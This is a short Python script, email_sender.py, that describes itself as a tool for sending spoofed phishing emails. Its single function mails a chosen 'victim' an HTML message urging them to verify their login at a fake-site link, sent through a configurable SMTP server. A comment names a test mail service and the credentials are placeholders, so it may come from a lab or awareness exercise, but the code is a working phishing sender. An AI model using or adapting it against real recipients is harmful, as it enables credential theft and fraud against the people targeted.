# email_sender.py
# ----------------------------------------
# Sends phishing emails using smtplib
# ----------------------------------------

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_phishing_email(target_email, subject, fake_link):
    """
    Sends a spoofed phishing email with a link to the fake site.

    :param target_email: Victim email address
    :param subject: Email subject line
    :param fake_link: URL to the fake phishing website
    """
    # Replace with an actual test SMTP server (e.g., Mailtrap, local SMTP)
    smtp_server = "smtp.mailtrap.io"
    port = 587
    sender_email = "spoof@example.com"
    sender_password = "your-password"

    # Create email message
    msg = MIMEMultipart("alternative")
    msg["Subject"] = subject
    msg["From"] = sender_email
    msg["To"] = target_email

    html = f"""\
    <html>
        <body>
            <p>Please verify your login here: 
            <a href="{fake_link}">{fake_link}</a></p>
        </body>
    </html>
    """
    msg.attach(MIMEText(html, "html"))

    # Send email
    with smtplib.SMTP(smtp_server, port) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, target_email, msg.as_string())
        print(f"[+] Email sent to {target_email}")
